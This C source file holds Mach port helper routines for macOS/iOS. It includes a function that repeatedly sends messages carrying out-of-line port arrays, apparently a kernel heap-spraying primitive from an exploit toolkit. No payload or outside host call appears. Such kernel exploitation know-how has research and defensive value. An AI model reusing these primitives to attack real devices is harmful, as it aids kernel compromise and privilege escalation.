#include "utils.h"
#include "port.h"


mach_port_t allocate_port(void)
{
    kern_return_t kr = 0;
    mach_port_t port  = MACH_PORT_NULL;

    kr = _kernelrpc_mach_port_allocate_trap(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);

    assert(kr == KERN_SUCCESS);
    mach_port_limits_t limits = { .mpl_qlimit = MACH_PORT_QLIMIT_LARGE };
    kr = mach_port_set_attributes(
        mach_task_self(),
        port,
        MACH_PORT_LIMITS_INFO,
        (mach_port_info_t)&limits,
        MACH_PORT_LIMITS_INFO_COUNT);
    assert(kr == KERN_SUCCESS);

    return port;
}

mach_port_t allocate_port_with_sright(void)
{
    kern_return_t kr = 0;
    mach_port_t port  = MACH_PORT_NULL;
    port = allocate_port();
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    assert(kr == KERN_SUCCESS);

    return port;
}

mach_port_t * allocate_ports(uint32_t count,bool sright)
{
    mach_port_t *ports  = calloc(count,sizeof(mach_port_t));

    for(int i=0; i < count; i++) {
        if (sright)
            ports[i] = allocate_port_with_sright();
        else
            ports[i] = allocate_port();
    }

    return ports;
}

void deallocate_ports(mach_port_t *ports,uint32_t count)
{
    for(int i=0; i < count; i++)
        mach_port_deallocate(self,ports[i]);
}


void destroy_ports(mach_port_t *ports,uint32_t count)
{
    for(int i=0; i < count; i++)
        mach_port_destroy(self,ports[i]);

}

mach_port_t do_ool_port_kalloc(mach_port_t dest, mach_port_t target_port,uint32_t port_count,uint32_t send_count)
{
    struct msg_ool_ports *msg = NULL;
    kern_return_t kr = KERN_SUCCESS;
    //struct msg_ool_ports_multi * msg = NULL;
    mach_msg_size_t size = sizeof(struct msg_ool_ports);

    msg = malloc(size);
    memset(msg,0,size);

    if (dest == 0)  {
            dest = allocate_port();

        mach_port_limits_t limits = { .mpl_qlimit = MACH_PORT_QLIMIT_LARGE };
        kr = mach_port_set_attributes(
            mach_task_self(),
            dest,
            MACH_PORT_LIMITS_INFO,
            (mach_port_info_t)&limits,
            MACH_PORT_LIMITS_INFO_COUNT);
        assert(kr == KERN_SUCCESS);
    }

    //port_count /= 8;
    mach_port_t *address = calloc(port_count,sizeof(mach_port_t));
    assert(address != NULL);

    for(uint32_t i=0; i < port_count; i++)
        address[i] = target_port;

    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = size;//sizeof(msg);
    msg->hdr.msgh_remote_port = dest;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0xabadc0de;
    msg->body.msgh_descriptor_count = 1;


    msg->ool_ports.address = address;
    msg->ool_ports.count = port_count;
    msg->ool_ports.deallocate = false;
    msg->ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
    //msg->ool_ports.disposition = MACH_MSG_TYPE_MOVE_SEND_ONCE; //MACH_MSG_TYPE_MAKE_SEND_ONCE;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;

    //printf("here msg size 0x%x \n",msg->hdr.msgh_size);
    //kr = mach_msg_send((mach_msg_header_t *)msg);
    for(int i=0; i < send_count;i++) {
        kr = mach_msg((mach_msg_header_t *)msg, MACH_SEND_MSG | MACH_SEND_ALWAYS ,
                  size, 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);

        //kr = mach_msg_overwrite(msg, MACH_SEND_MSG, size, 0, 0, 0, 0,NULL,0);
        CHECK_MACH_ERR(kr, "mach_msg");
        //assert(kr == KERN_SUCCESS);
    }

    free(msg);
    return dest;
}
